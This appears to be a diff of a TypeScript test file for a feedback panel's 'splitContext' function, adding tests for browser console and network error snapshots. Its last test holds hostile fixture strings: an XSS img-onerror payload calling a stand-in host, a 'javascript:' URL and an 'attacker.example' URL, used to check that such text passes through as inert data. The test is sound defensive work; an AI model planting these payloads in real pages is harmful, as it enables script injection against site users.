@@ -125,7 +125,7 @@ describe('feedbackAreaOptions', () => {
 });
 
 describe('splitContext', () => {
-  it('names the five keys the panel renders', () => {
+  it('names every key the panel renders', () => {
     // Realistic ids: the producer writes `randomUUID()`, and `splitContext` refuses anything that
     // is not shaped like a Cloudflare key — a short stand-in would be rejected here for a reason
     // that has nothing to do with what this case is about.
@@ -137,19 +137,30 @@ describe('splitContext', () => {
       images,
       screenshotId,
       sessionId: 'v913JNcgDs',
+      consoleErrors: ['TypeError: x is not a function'],
+      networkErrors: [
+        { url: 'https://civitai.com/api/trpc/x', status: 500, initiatorType: 'fetch' },
+      ],
     });
 
+    // 🔴 A WHOLE-OBJECT `toEqual`, which makes this the LEDGER: a key added to `FeedbackContext`
+    // without being added here fails with an object diff rather than passing unnoticed. That is
+    // what it did when `consoleErrors`/`networkErrors` landed, which is the behaviour to keep.
     expect(ctx).toEqual({
       path: '/apps',
       filters: { kind: 'onsite' },
       images,
       screenshotId,
       sessionId: 'v913JNcgDs',
+      consoleErrors: ['TypeError: x is not a function'],
+      networkErrors: [
+        { url: 'https://civitai.com/api/trpc/x', status: 500, initiatorType: 'fetch' },
+      ],
       other: null,
     });
   });
 
-  it('puts a key none of the five cover into "other" — this is what stops a future area vanishing', () => {
+  it('puts a key none of them cover into "other" — this is what stops a future area vanishing', () => {
     const ctx = splitContext({ path: '/apps', pagesLoaded: 3, reportedSource: 'edge' });
 
     expect(ctx.other).toEqual({ pagesLoaded: 3, reportedSource: 'edge' });
@@ -172,9 +183,124 @@ describe('splitContext', () => {
         images: [],
         screenshotId: null,
         sessionId: null,
+        consoleErrors: [],
+        networkErrors: [],
         other: null,
       });
     }
+  });
+
+  /**
+   * The browser-error snapshot. The panel renders these as TEXT and builds no URL from them, so
+   * unlike `images` there is no per-entry filter here — the guard that matters is the one in the
+   * template, pinned in `feedback-panel-tripwires.test.ts`. What this block covers is the shape
+   * routing: a well-formed array is carried, and anything else is VISIBLE under "other" rather
+   * than silently shortened or dropped.
+   */
+  describe('the browser-error snapshot', () => {
+    const ENTRY = { url: 'https://civitai.com/api/trpc/x', status: 500, initiatorType: 'fetch' };
+
+    it('carries both arrays through', () => {
+      const ctx = splitContext({ consoleErrors: ['boom', 'boom'], networkErrors: [ENTRY] });
+      expect(ctx.consoleErrors).toEqual(['boom', 'boom']);
+      expect(ctx.networkErrors).toEqual([ENTRY]);
+      expect(ctx.other).toBeNull();
+    });
+
+    it('is empty arrays, never null, when the keys are absent — the ordinary case', () => {
+      const ctx = splitContext({ path: '/apps' });
+      expect(ctx.consoleErrors).toEqual([]);
+      expect(ctx.networkErrors).toEqual([]);
+    });
+
+    it('carries a stored empty array without routing it to "other"', () => {
+      const ctx = splitContext({ consoleErrors: [], networkErrors: [] });
+      expect(ctx.consoleErrors).toEqual([]);
+      expect(ctx.networkErrors).toEqual([]);
+      expect(ctx.other).toBeNull();
+    });
+
+    it('keeps a duplicated console line — the same error twice IS the signal', () => {
+      // Deliberately NOT deduplicated, unlike `images`. "This fired 6 times" is the useful fact,
+      // and the panel keys by index so a repeat cannot make the row unopenable.
+      const ctx = splitContext({ consoleErrors: ['same', 'same', 'same'] });
+      expect(ctx.consoleErrors).toHaveLength(3);
+    });
+
+    it('shows the WHOLE array under "other" when one console entry is not a string', () => {
+      // All-or-nothing: a moderator seeing 2 of 3 lines with no indication one was dropped is
+      // worse off than one seeing the raw JSON.
+      const value = ['ok', 42];
+      const ctx = splitContext({ consoleErrors: value });
+      expect(ctx.consoleErrors).toEqual([]);
+      expect(ctx.other).toEqual({ consoleErrors: value });
+    });
+
+    it.each([
+      ['a missing url', { status: 500, initiatorType: 'fetch' }],
+      ['a missing status', { url: 'https://a.io/x', initiatorType: 'fetch' }],
+      // 🔴 THE ONE THAT LOOKS SKIPPABLE. `initiatorType` is a closed set in the spec, so a guard
+      // that omits it reads as complete — but the value comes from a JSONB column, not a browser,
+      // and an object here renders as `[object Object]` in the queue instead of being dumped.
+      ['a missing initiatorType', { url: 'https://a.io/x', status: 500 }],
+      ['an object initiatorType', { url: 'https://a.io/x', status: 500, initiatorType: { a: 1 } }],
+      ['a string status', { url: 'https://a.io/x', status: '500', initiatorType: 'fetch' }],
+      ['a NaN status', { url: 'https://a.io/x', status: NaN, initiatorType: 'fetch' }],
+      ['a bare string instead of an entry', 'https://a.io/x'],
+      ['null instead of an entry', null],
+      ['an array instead of an entry', []],
+    ])('routes a network array holding %s to "other"', (_label, bad) => {
+      const ctx = splitContext({ networkErrors: [ENTRY, bad] });
+      expect(ctx.networkErrors).toEqual([]);
+      expect(ctx.other).toEqual({ networkErrors: [ENTRY, bad] });
+    });
+
+    it('routes a non-array to "other" rather than pretending the key was absent', () => {
+      const ctx = splitContext({ consoleErrors: 'boom', networkErrors: { url: 'x' } });
+      expect(ctx.consoleErrors).toEqual([]);
+      expect(ctx.networkErrors).toEqual([]);
+      expect(ctx.other).toEqual({ consoleErrors: 'boom', networkErrors: { url: 'x' } });
+    });
+
+    /**
+     * 🔴 THE READ SIDE IMPOSES NO BOUNDS AND THAT IS DELIBERATE — this asserts the decision rather
+     * than leaving it to be re-litigated. The producer bounds count, length and status range at
+     * write time; re-imposing them here would send a row stored under a future widened bound to
+     * the "other" bucket, which is a display regression, not a protection. Nothing on this side
+     * does arithmetic with `status` or builds a URL from `url`.
+     */
+    it('carries a row that exceeds every producer-side bound, because storage is not validation', () => {
+      const ctx = splitContext({
+        consoleErrors: Array.from({ length: 50 }, () => 'x'.repeat(5000)),
+        networkErrors: [{ url: 'https://a.io/x', status: 200, initiatorType: 'fetch' }],
+      });
+      expect(ctx.consoleErrors).toHaveLength(50);
+      expect(ctx.networkErrors[0].status).toBe(200);
+      expect(ctx.other).toBeNull();
+    });
+
+    /**
+     * 🔴 HOSTILE TEXT IS CARRIED, NOT FILTERED, AND THE CONTAINMENT IS THE TEMPLATE. This pins
+     * that `splitContext` does not quietly grow an `IMAGE_KEY`-style filter here — if one is ever
+     * added, this test says so and its author has to state why. The reason none is needed is that
+     * Svelte escapes interpolated text and the panel builds no `href`/`src` from these fields;
+     * `feedback-panel-tripwires.test.ts` is what holds that end.
+     */
+    it('carries markup, a javascript: URL and an attacker origin through as plain data', () => {
+      const hostile = '<img src=x onerror="fetch(`//evil.test`)">';
+      const ctx = splitContext({
+        consoleErrors: [hostile],
+        networkErrors: [
+          { url: 'javascript:alert(1)', status: 500, initiatorType: 'fetch' },
+          { url: 'https://attacker.example/pixel.png', status: 404, initiatorType: 'img' },
+        ],
+      });
+      expect(ctx.consoleErrors).toEqual([hostile]);
+      expect(ctx.networkErrors.map((e) => e.url)).toEqual([
+        'javascript:alert(1)',
+        'https://attacker.example/pixel.png',
+      ]);
+    });
   });
 
   /**
